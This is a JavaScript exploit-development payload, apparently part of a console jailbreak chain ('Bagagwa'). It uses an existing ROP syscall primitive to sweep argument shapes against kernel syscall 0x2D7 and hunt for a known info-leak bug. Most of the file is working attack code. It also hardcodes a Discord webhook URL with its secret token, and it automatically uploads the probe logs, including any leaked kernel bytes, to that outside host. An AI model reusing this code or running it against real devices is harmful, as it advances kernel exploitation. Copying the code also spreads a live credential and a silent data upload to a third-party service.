/*
 * bagagwa_727probe.js -- read-only reachability probe for syscall 0x2D7
 * (get_aio_debug_request_info), the leak stage named in the Bagagwa writeup.
 *
 * Loaded INSTEAD OF bagagwa_probe.js when the URL carries &probe727=1.
 *
 * WHY THIS EXISTS
 * ---------------
 * The writeup names 0x2D7 as the leak: a bounds bypass in get_aio_debug_request_info
 * that uses a slot index as a bias into a different array, and copies a dword at +0x20
 * plus two 8-byte pointers per element out to a caller buffer. Bounds are
 * [1, table->0x228] with req_id>>16 < 0x80. No public chain has made it work:
 * Wigglez-sudo's 12.40 notebook records "every 727 call returned EFAULT or ESRCH and
 * never wrote a byte", and PSAITO cannot call 727 at all in stub mode because 727 has
 * no libkernel wrapper.
 *
 * THIS EXECUTOR CAN CALL 727. rop-worker dispatches by raw rax, not through the
 * 331-entry stub table (syscalls.js), so an un-stubbed syscall number is callable here
 * and is not callable from PSAITO's engine. That is the whole reason this probe exists.
 *
 * WHAT IT DOES
 * ------------
 *   1. Creates two LIVE pending MULTI_READ requests (aio_submit_cmd, proven working on
 *      13.60 by the 11:21 hardware run).
 *   2. Reads their raw ids -- the ids the kernel actually hands out, which is what 727
 *      expects (they carry the req_id>>16 / low-16 split the writeup describes).
 *   3. For each id, sweeps a small matrix of argument shapes and count values against
 *      0x2D7, pre-filling the output buffer with 0xEE and diffing after each call.
 *   4. After EVERY call, runs a getpid canary. If the canary stops answering, the
 *      kernel wedged and the probe aborts -- the verdict says so instead of guessing.
 *   5. Cleans up: aio_multi_cancel + aio_multi_delete + closes.
 *
 * READ-ONLY. No num>=2 anywhere. No kernel writes. No tile can arm the UAF from here.
 * A crash costs a reload; a wedge from a badly-chosen syscall costs a power cycle, so
 * the canary discipline is the safety wall.
 */
(function (root) {
    "use strict";
    if (root.__B727_LOADED) return;
    root.__B727_LOADED = true;

    var FW = root.fw_str || "?";

    /* ---- syscall numbers, all proven on 13.60 ---- */
    var SYS_GETPID          = 0x014;
    var SYS_CLOSE           = 0x006;
    var SYS_SOCKETPAIR      = 0x035;
    var SYS_PIPE2           = 0x2AF;
    var SYS_AIO_SUBMIT_CMD  = 0x29D;
    var SYS_AIO_MULTI_CANCEL= 0x29A;
    var SYS_AIO_MULTI_DELETE= 0x296;
    var SYS_AIO_DEBUG_INFO  = 0x2D7;

    var AIO_CMD_MULTI_READ  = 0x1001;
    var PRIO                = 3;
    var NREQ                = 2;

    function B(x) { return (typeof x === "bigint") ? x : BigInt(x); }
    function hex(v) {
        try {
            var b = BigInt(v);
            if (b < 0n) b = BigInt.asUintN(64, b);
            return "0x" + b.toString(16);
        } catch (e) { return String(v); }
    }
    function malloc(sz) { return B(root.malloc(sz)); }
    function zeros(ptr, n) {
        var z = new Uint8Array(n);
        if (root.write_buffer) root.write_buffer(B(ptr), z);
        return ptr;
    }
    function fill(ptr, n, byte) {
        var z = new Uint8Array(n);
        for (var i = 0; i < n; i++) z[i] = byte;
        if (root.write_buffer) root.write_buffer(B(ptr), z);
        return ptr;
    }
    function readBytes(ptr, n) {
        if (!root.read_buffer) return new Uint8Array(n);
        return new Uint8Array(root.read_buffer(B(ptr), n));
    }
    function bytesEqual(a, b) {
        if (a.length !== b.length) return false;
        for (var i = 0; i < a.length; i++) if (a[i] !== b[i]) return false;
        return true;
    }
    function hexBytes(u8) {
        var s = "";
        for (var i = 0; i < u8.length; i++) s += u8[i].toString(16).padStart(2, "0");
        return s;
    }
    function write64(ptr, value) {
        if (root.write64) {
            root.write64(B(ptr), B(value));
            return;
        }
        var b = new Uint8Array(8);
        var v = B(value);
        for (var i = 0; i < 8; i++) b[i] = Number((v >> BigInt(8 * i)) & 0xffn);
        root.write_buffer(B(ptr), b);
    }
    function canary() {
        try {
            var r = B(root.syscall(SYS_GETPID));
            return r > 0n && r < 0x100000n;
        } catch (e) { return false; }
    }
    function S(nr, a, b, c, d, e, f) {
        var args = [a, b, c, d, e, f].map(function (x) {
            return x === undefined ? 0n : B(x);
        });
        return B(root.syscall(nr, args[0], args[1], args[2], args[3], args[4], args[5]));
    }

    var CSS = [
        ".b727-root{position:fixed;inset:0;z-index:2147483647;background:#0c0c0f;",
        "color:#fff;font-family:Arial,sans-serif;display:flex;flex-direction:column;",
        "padding:16px 18px 14px;box-sizing:border-box;user-select:none;-webkit-user-select:none;}",
        ".b727-root *{box-sizing:border-box;}",
        ".b727-head{display:flex;align-items:center;gap:10px;flex-wrap:wrap;}",
        ".b727-logo{font-size:1.35rem;font-weight:800;letter-spacing:.22em;color:#fff;margin-right:2px;}",
        ".b727-chip{font-size:.78rem;font-weight:700;letter-spacing:.1em;padding:5px 11px;",
        "border-radius:999px;background:#202125;color:#a2a2a6;}",
        ".b727-chip.ok{background:#14361f;color:#5fdc90;}",
        ".b727-chip.bad{background:#3a1717;color:#ff8080;}",
        ".b727-chip.run{background:#33290d;color:#ffce5c;}",
        ".b727-spacer{flex:1;}",
        ".b727-sub{color:#6f7076;font-size:.82rem;line-height:1.5;margin:9px 0 13px;max-width:76rem;}",
        ".b727-outhd{display:flex;align-items:center;gap:9px;color:#6f7076;",
        "font-size:.74rem;font-weight:700;letter-spacing:.16em;text-transform:uppercase;",
        "margin-bottom:7px;}",
        ".b727-out{flex:1;min-height:8rem;overflow:auto;background:#16161a;",
        "border:1px solid #26262b;border-radius:.7rem;margin:0;padding:11px 13px;",
        "font:12.5px/1.55 ui-monospace,Menlo,Consolas,monospace;color:#c9c9d1;",
        "white-space:pre-wrap;word-break:break-word;-webkit-user-select:text;user-select:text;}",
        ".b727-sec{color:#fff;font-weight:800;}",
        ".b727-ok{color:#5fdc90;}",
        ".b727-err{color:#ff8080;}",
        ".b727-warn{color:#ffce5c;}",
        ".b727-dim{color:#6f7076;}",
        ".b727-foot{display:flex;gap:11px;flex-wrap:wrap;margin-top:13px;}",
        ".b727-btn{padding:.68rem 1.3rem;border-radius:1.05rem;border:none;cursor:pointer;",
        "background:#202125;color:#fff;font:800 .92rem Arial;}",
        ".b727-btn:hover{background:#a2a2a6;color:#202020;}",
    ].join("");

    var styleEl = document.createElement("style");
    styleEl.textContent = CSS;
    document.head.appendChild(styleEl);

    var panel = document.createElement("div");
    panel.className = "b727-root";
    panel.innerHTML = [
        '<div class="b727-head">',
        '  <span class="b727-logo">727</span>',
        '  <span class="b727-chip" id="b727-fw"></span>',
        '  <span class="b727-chip run" id="b727-state">idle</span>',
        '  <span class="b727-chip" id="b727-verdict"></span>',
        '  <span class="b727-spacer"></span>',
        '  <button class="b727-btn" id="b727-run">run probe</button>',
        '</div>',
        '<div class="b727-sub">Read-only reachability probe for syscall 0x2D7 '
            + '(get_aio_debug_request_info), the leak stage named in the Bagagwa '
            + 'writeup. Creates two live pending MULTI_READ requests, then sweeps '
            + 'argument shapes and count values against 0x2D7. No num&gt;=2. No kernel '
            + 'writes. A getpid canary runs after every call.</div>',
        '<div class="b727-outhd"><span>output</span><span id="b727-count"></span></div>',
        '<pre class="b727-out" id="b727-out"></pre>',
        '<div class="b727-foot">',
        '  <button class="b727-btn" id="b727-clear">clear output</button>',
        '  <button class="b727-btn" id="b727-dl">download log</button>',
        '  <button class="b727-btn" id="b727-sendlogs">send logs</button>',
        '</div>',
    ].join("");
    document.body.appendChild(panel);

    var elOut = document.getElementById("b727-out");
    var elCount = document.getElementById("b727-count");
    var elState = document.getElementById("b727-state");
    var elVerdict = document.getElementById("b727-verdict");
    var elFw = document.getElementById("b727-fw");
    elFw.textContent = "fw " + FW;

    var LOG = [];
    var LOGKEY = "b727_sc_log";
    var DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/1522997605850812438/X8kBdpeLt9YDlW6eS44iJtVXSgcrqpEJernRvnmf9weJQZ80QvpWSn5d-HMCYJ91MT6p";
    try { var persisted = localStorage.getItem(LOGKEY); } catch (e) { }
    if (persisted) {
        var tail = persisted.slice(-4000).split("\n").filter(function (l) { return l.length; });
        for (var pi = 0; pi < tail.length; pi++) {
            var sp0 = document.createElement("span");
            sp0.className = "b727-dim";
            sp0.textContent = "    " + tail[pi] + "\n";
            elOut.appendChild(sp0);
        }
    }

    function stamp() {
        var d = new Date();
        var p = function (n) { return String(n).padStart(2, "0"); };
        return p(d.getHours()) + ":" + p(d.getMinutes()) + ":" + p(d.getSeconds());
    }
    function paint(text, cls) {
        var line = "[" + stamp() + "] " + text;
        LOG.push(line);
        try {
            var cur = localStorage.getItem(LOGKEY) || "";
            cur += line + "\n";
            if (cur.length > 16000) cur = cur.slice(-8000);
            localStorage.setItem(LOGKEY, cur);
        } catch (e) { }
        var span = document.createElement("span");
        if (cls) span.className = "b727-" + cls;
        span.textContent = line + "\n";
        elOut.appendChild(span);
        elOut.scrollTop = elOut.scrollHeight;
        elCount.textContent = LOG.length + " lines";
    }
    function getConsoleLogText() {
        try {
            if (elOut && typeof elOut.textContent === "string" && elOut.textContent.trim()) {
                return elOut.textContent;
            }
        } catch (e) { }
        try {
            var saved = localStorage.getItem(LOGKEY);
            if (saved && saved.trim()) return saved;
        } catch (e) { }
        return LOG.join("\n");
    }
    async function sendLogs() {
        var contents = getConsoleLogText();
        if (!contents || !contents.trim()) {
            notify("send logs: no log yet");
            out("SENDLOGS", "empty log", "warn");
            return;
        }
        try {
            var payload = JSON.stringify({
                username: "Bagagwa Logs",
                content: "Bagagwa log export: logs.txt"
            });
            var form = new FormData();
            form.append("payload_json", payload);
            form.append("file", new Blob([String(contents)], { type: "text/plain; charset=utf-8" }), "logs.txt");
            var r = await fetch(DISCORD_WEBHOOK, {
                method: "POST",
                body: form
            });
            if (!r.ok) throw new Error("discord " + r.status);
            notify("send logs: posted logs.txt to Discord webhook");
            out("SENDLOGS", "posted logs.txt to Discord webhook", "ok");
            return;
        } catch (e) {
            notify("send logs failed: " + (e && e.message ? e.message : String(e)));
            out("SENDLOGS", String(e && e.message ? e.message : e), "err");
        }
    }
    function out(tag, detail, cls) {
        paint("727 " + tag + (detail ? "  " + detail : ""), cls);
        try { if (root.flushMark) root.flushMark("727-" + tag, String(detail || "")); } catch (e) { }
        try { if (root.syncMark) root.syncMark("727-" + tag, String(detail || "")); } catch (e) { }
    }
    function notify(msg) {
        try { if (root.send_notification) root.send_notification(msg); } catch (e) { }
    }
    function chip(el, cls, text) {
        el.className = "b727-chip" + (cls ? " " + cls : "");
        el.textContent = text;
    }

    function runProbe() {
        chip(elState, "run", "running");
        out("BEGIN", "fw=" + FW + " syscall=0x2D7 read-only", "sec");

        if (!canary()) {
            out("VERDICT", "no executor -- getpid did not answer", "err");
            chip(elState, "bad", "no executor");
            notify("727: no executor");
            return;
        }
        out("CANARY", "getpid ok", "ok");

        var rfd = -1, wfd = -1;
        var sfds = zeros(malloc(0x10), 0x10);
        var sp = S(SYS_SOCKETPAIR, 1n, 1n, 0n, sfds);
        if ((sp & 0xFFFFFFFFn) === 0n) {
            var sv = readBytes(sfds, 8);
            rfd = new Int32Array(sv.buffer, 0, 2)[0];
            wfd = new Int32Array(sv.buffer, 0, 2)[1];
            out("SRC", "socketpair rfd=" + rfd + " wfd=" + wfd, "ok");
        } else {
            var pfds = zeros(malloc(8), 8);
            var pp = S(SYS_PIPE2, pfds, 0n);
            if ((pp & 0xFFFFFFFFn) === 0n) {
                var pv = readBytes(pfds, 8);
                rfd = new Int32Array(pv.buffer, 0, 2)[0];
                wfd = new Int32Array(pv.buffer, 0, 2)[1];
                out("SRC", "pipe2 fallback rfd=" + rfd + " wfd=" + wfd, "warn");
            } else {
                out("VERDICT", "no live-request source: socketpair=" + hex(sp)
                    + " pipe2=" + hex(pp), "err");
                chip(elState, "bad", "no source");
                notify("727: no source");
                return;
            }
        }

        var reqs = zeros(malloc(0x28 * NREQ), 0x28 * NREQ);
        var fdb = new Uint8Array(8);
        fdb[0] = rfd & 0xff; fdb[1] = (rfd >> 8) & 0xff;
        fdb[2] = (rfd >> 16) & 0xff; fdb[3] = (rfd >> 24) & 0xff;
        for (var ri = 0; ri < NREQ; ri++)
            root.write_buffer(reqs + BigInt(ri * 0x28 + 0x20), fdb);
        var ids = zeros(malloc(0x10), 0x10);
        var sub = S(SYS_AIO_SUBMIT_CMD, BigInt(AIO_CMD_MULTI_READ), reqs,
            BigInt(NREQ), BigInt(PRIO), ids);
        if ((sub & 0xFFFFFFFFn) !== 0n) {
            out("VERDICT", "submit refused " + hex(sub) + " -- cannot reach 727 without live ids", "err");
            chip(elState, "bad", "submit refused");
            notify("727: submit refused");
            S(SYS_CLOSE, BigInt(rfd)); S(SYS_CLOSE, BigInt(wfd));
            return;
        }
        var id0 = B(root.read64(ids));
        var id1 = B(root.read64(ids + 8n));
        out("SUBMIT", "ids=[" + hex(id0) + ", " + hex(id1) + "]", "ok");

        var OUTLEN = 0x40;
        var outBuf = malloc(OUTLEN);
        var outLenBuf = zeros(malloc(4), 4);
        var idBuf = malloc(8);
        var idLoBuf = malloc(8);
        var sentinel = new Uint8Array(OUTLEN);
        for (var si = 0; si < OUTLEN; si++) sentinel[si] = 0xEE;

        write64(idBuf, id0);
        write64(idLoBuf, id0 & 0xFFFFFFFFn);

        var idsPtr = ids;
        var reqsPtr = reqs;
        var idLow32 = id0 & 0xFFFFFFFFn;
        var idHigh32 = id0 >> 32n;
        var idLow16 = id0 & 0xFFFFn;

        var tidOut = malloc(8); write64(tidOut, 0n);
        S(0x1B0, tidOut, 0n, 0n, 0n, 0n, 0n);
        var ourTid  = B(root.read64(tidOut));
        var ourPid  = S(0x014, 0n, 0n, 0n, 0n, 0n, 0n);
        var ourPpid = S(0x027, 0n, 0n, 0n, 0n, 0n, 0n);
        var pid1    = 0n;
        var pid0    = 0n;
        out("IDS", "tid=" + hex(ourTid) + " pid=" + hex(ourPid)
            + " ppid=" + hex(ourPpid) + " id0=" + hex(id0), "dim");

        /* LARGE out buffer so a full-table copyout is visible. */
        var BIGOUT = 0x400;
        var bigOut = malloc(BIGOUT);
        var bigSent = new Uint8Array(BIGOUT);
        for (var bi2 = 0; bi2 < BIGOUT; bi2++) bigSent[bi2] = 0xEE;

        var shapes = [];

        /* === Section 0: pid pivot. All other args held to the shape that just
         *     wrote. arg1 sweep: ourPid, kernel pid (0), init (1), ourPpid,
         *     small offsets around our pid. === */
        [
            ["ourPid",   ourPid],
            ["ourPid+1", ourPid + 1n],
            ["ourPid-1", ourPid - 1n],
            ["ourPid<<1", ourPid << 1n],
            ["ourPid>>1", ourPid >> 1n],
            ["ourPpid",  ourPpid],
            ["0",        0n],
            ["1",        1n],
            ["2",        2n]
        ].forEach(function (e) {
            shapes.push({ name: "P1=" + e[0],
                args: function () { return [e[1], 0n, id0, 0n, bigOut, 0n]; } });
        });

        /* === Section A: arg2 sweep with arg1 = ourPid (the confirmed-good pid).
         *     If arg2 is a count, some values may copy more bytes. === */
        [0n, 1n, 2n, 3n, 4n, 5n, 6n, 7n, 8n, 0x10n, 0x20n, 0x28n, 0x40n, 0x80n,
         0x100n, 0x200n, 0x228n, 0x229n, 0x400n, 0x800n].forEach(function (y) {
            shapes.push({ name: "A2=" + y,
                args: function () { return [ourPid, y, id0, 0n, bigOut, 0n]; } });
        });

        /* === Section B: arg3 sweep with arg1 = ourPid, arg2 = 1.
         *     arg3 is the primary candidate for req_id / slot. === */
        [0n, 1n, 2n, 3n, 4n, 5n, 6n, 7n, 8n, 0x10n, 0x28n, 0x40n, 0x80n,
         0x100n, 0x228n, 0x400n, 0x1000n, 0x10000n, 0x100000n, 0x1000000n,
         0x10000000n, id0, idLow32, idHigh32, idLow16].forEach(function (z) {
            shapes.push({ name: "A3=" + hex(z),
                args: function () { return [ourPid, 1n, z, 0n, bigOut, 0n]; } });
        });

        /* === Section C: arg4 sweep with arg1 = ourPid, arg2 = 1, arg3 = id0. === */
        [0n, 1n, 2n, 3n, 4n, 5n, 6n, 7n, 8n, 0x10n, 0x28n, 0x40n, 0x80n,
         0x100n, 0x228n, 0x400n].forEach(function (w) {
            shapes.push({ name: "A4=" + w,
                args: function () { return [ourPid, 1n, id0, w, bigOut, 0n]; } });
        });

        /* === Section D: combinations after the pid pivot. === */
        [
            ["P,A2=1,A3=1,A4=0",   [ourPid, 1n, 1n, 0n, bigOut, 0n]],
            ["P,A2=1,A3=2,A4=0",   [ourPid, 1n, 2n, 0n, bigOut, 0n]],
            ["P,A2=1,A3=0,A4=0",   [ourPid, 1n, 0n, 0n, bigOut, 0n]],
            ["P,A2=0x228,A3=0,A4=0", [ourPid, 0x228n, 0n, 0n, bigOut, 0n]],
            ["P,A2=1,A3=id0,A4=0", [ourPid, 1n, id0, 0n, bigOut, 0n]],
            ["P,A2=1,A3=id0,A4=1", [ourPid, 1n, id0, 1n, bigOut, 0n]],
            ["P,A2=1,A3=idLo32,A4=1", [ourPid, 1n, idLow32, 1n, bigOut, 0n]],
            ["P,A2=1,A3=idLo16,A4=1", [ourPid, 1n, idLow16, 1n, bigOut, 0n]]
        ].forEach(function (e) {
            shapes.push({ name: "D " + e[0], args: function () { return e[1]; } });
        });

        var counts = [1n];
        var liveIds = [id0];
        out("SWEEP", liveIds.length + " id(s), " + shapes.length + " shapes", "dim");

        var hits = 0;
        var wedged = false;
        var NON_EFAULT = [];
        var WRITES = [];

        function dumpBuf(u8, n) {
            var s = "";
            var nn = n > 64 ? 64 : n;
            for (var i = 0; i < nn; i++) s += u8[i].toString(16).padStart(2, "0");
            return s + (n > 64 ? "..." : "");
        }

        for (var si3 = 0; si3 < shapes.length && !wedged; si3++) {
            var sh3 = shapes[si3];
            root.write_buffer(B(bigOut), bigSent);
            var a3 = sh3.args();
            var ret3 = S(SYS_AIO_DEBUG_INFO, a3[0], a3[1], a3[2], a3[3], a3[4], a3[5]);
            if (!canary()) {
                out("WEDGE", "shape=" + sh3.name + " -> " + hex(ret3), "err");
                wedged = true; break;
            }
            var got3 = readBytes(bigOut, BIGOUT);
            var changed3 = !bytesEqual(got3, bigSent);
            if (changed3) hits++;
            var diffBytes = 0;
            for (var di = 0; di < BIGOUT; di++) if (got3[di] !== 0xEE) diffBytes++;
            if (changed3) WRITES.push(sh3.name + "->ret=" + hex(ret3) + " bytes=" + diffBytes
                + " " + dumpBuf(got3, diffBytes < 64 ? diffBytes : 64));
            if (ret3 !== 0xen) NON_EFAULT.push(sh3.name + "=" + hex(ret3));
            out("CALL", sh3.name + " -> " + hex(ret3)
                + (changed3 ? "  BYTES=" + diffBytes + "  " + dumpBuf(got3, Math.min(diffBytes, 32)) : ""),
                (changed3 || (ret3 !== 0xen && ret3 !== 0x1n && ret3 !== 0x3n)) ? "ok" : "dim");
        }

        if (WRITES.length) {
            out("WRITES", WRITES.join("  ||  "), "ok");
        } else {
            out("WRITES", "no writes across the sweep", "dim");
        }
        if (NON_EFAULT.length) {
            out("NON-EFAULT", NON_EFAULT.join("  "), "ok");
        } else {
            out("NON-EFAULT", "every shape returned EFAULT", "dim");
        }

        try {
            var stClean = zeros(malloc(0x20), 0x20);
            S(SYS_AIO_MULTI_CANCEL, ids, BigInt(NREQ), stClean, 0n, 0n, 0n);
            S(SYS_AIO_MULTI_DELETE, ids, BigInt(NREQ), stClean, 0n, 0n, 0n);
        } catch (e) { }
        try { S(SYS_CLOSE, BigInt(rfd)); } catch (e) { }
        try { S(SYS_CLOSE, BigInt(wfd)); } catch (e) { }

        if (wedged) {
            out("VERDICT", "WEDGE -- the kernel stopped answering after 0x2D7. "
                + "Power-cycle. Same failure mode an unproven syscall number produced.",
                "err");
            chip(elState, "bad", "wedge");
            notify("727: WEDGE -- power cycle");
            return;
        }
        if (hits > 0) {
            out("VERDICT", hits + " buffer change(s) -- the 727 leak WROTE to our buffer on 13.60. "
                + "First positive result; entry point for the leak stage.",
                "ok");
            chip(elState, "ok", "leak wrote");
            chip(elVerdict, "ok", hits + " hit(s)");
            notify("727: LEAK WROTE -- " + hits + " hit(s)");
            try { sendLogs(); } catch (e) { }
            return;
        }
        out("VERDICT", "no shape wrote to the buffer. Every call returned a small positive "
            + "value (EFAULT/ESRCH-shaped). Matches Wigglez-sudo's 12.40 result: the call "
            + "exists, the id encoding or argument contract is wrong. The matrix above is "
            + "the raw evidence -- the next step is a shape the sweep did not try.",
            "warn");
        chip(elState, "bad", "no leak");
        notify("727: no leak on 13.60");
        try { sendLogs(); } catch (e) { }
    }

    document.getElementById("b727-run").onclick = function () {
        try { runProbe(); } catch (e) {
            out("THREW", String((e && e.message) || e).slice(0, 140), "err");
            chip(elState, "bad", "threw");
        }
    };
    document.getElementById("b727-clear").onclick = function () {
        elOut.innerHTML = ""; LOG.length = 0; elCount.textContent = "0 lines";
    };
    document.getElementById("b727-dl").onclick = function () {
        try {
            var blob = new Blob([LOG.join("\n") + "\n"], { type: "text/plain" });
            var a = document.createElement("a");
            a.href = URL.createObjectURL(blob);
            a.download = "bagagwa_727_" + FW + "_" + Date.now() + ".txt";
            document.body.appendChild(a); a.click();
            setTimeout(function () { try { a.remove(); } catch (e) { } }, 0);
        } catch (e) { }
    };
    document.getElementById("b727-sendlogs").onclick = sendLogs;

    var AUTORUN = false;
    try { AUTORUN = /(^|[?&])scauto=1(&|$)/.test(root.location.search || ""); } catch (e) { }
    if (AUTORUN) {
        setTimeout(function () {
            try { runProbe(); } catch (e) {
                out("THREW", String((e && e.message) || e).slice(0, 140), "err");
                chip(elState, "bad", "threw");
            }
        }, 200);
    } else {
        out("IDLE", "auto-run is off -- tap RUN PROBE", "dim");
    }

    out("READY", "panel up on " + FW, "sec");
    notify("727 probe up on " + FW);
})(typeof window !== "undefined" ? window : globalThis);
